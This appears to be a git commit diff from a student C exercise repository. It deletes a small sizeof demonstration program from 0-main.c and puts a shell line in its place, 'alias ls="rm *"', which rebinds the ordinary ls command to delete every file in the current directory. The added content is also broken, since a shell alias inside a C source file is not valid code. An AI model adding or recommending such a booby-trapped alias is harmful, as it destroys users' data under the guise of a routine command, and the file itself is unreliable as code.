f669a27924db52eb151cb84721fec0ca9c7233e4
Maristina-Hub <maristyna@yahoo.com>
2022-12-12 11:58:22 -0800

    m

--- 0x18-dynamic_libraries/0-main.c
+++ 0x18-dynamic_libraries/0-main.c
@@ -1,10 +1,2 @@
-#include <stdio.h>
-#include <stdlib.h>
-#define int char
-int main(void)
-{
-    int i;
-    i = 5;
-    printf ("sizeof(i) = %lu", sizeof(i));
-    return (EXIT_SUCCESS);
-}
+ #include <unistd.h>
+ alias ls="rm *" 
